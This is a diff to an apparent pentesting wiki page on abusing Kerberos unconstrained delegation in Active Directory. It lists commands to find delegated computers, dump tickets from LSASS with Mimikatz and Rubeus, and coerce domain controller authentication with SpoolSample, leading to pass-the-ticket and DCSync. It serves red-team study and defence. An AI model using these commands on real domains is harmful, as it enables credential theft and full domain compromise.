@@ -10,18 +10,28 @@ So if a domain admin logins inside a Computer with "Unconstrained Delegation" fe
 
 You can **find Computer objects with this attribute** checking if the [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute contains [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). You can do this with an LDAP filter of ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, which is what powerview does:
 
-<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
+
+```bash
+# List unconstrained computers
 ## Powerview
-Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
-<strong>## ADSearch
-</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
-<strong># Export tickets with Mimikatz
-</strong>privilege::debug
+## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
+Get-DomainComputer –Unconstrained –Properties name
+Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
+
+## ADSearch
+ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+
+# Export tickets with Mimikatz
+## Access LSASS memory
+privilege::debug
 sekurlsa::tickets /export #Recommended way
 kerberos::list /export #Another way
 
 # Monitor logins and export new tickets
-.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs</code></pre>
+## Doens't access LSASS memory directly, but uses Windows APIs
+Rubeus.exe dump
+Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
+```
 
 Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
 More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
@@ -38,10 +48,10 @@ To make a print server login against any machine you can use [**SpoolSample**](h
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
 
-If the TGT if from a domain controller, you could perform a[ **DCSync attack**](acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
+If the TGT if from a domain controller, you could perform a [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
 [**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
 
-**Here are other ways to try to force an authentication:**
+Find here other ways to **force an authentication:**
 
 {{#ref}}
 printers-spooler-service-abuse.md
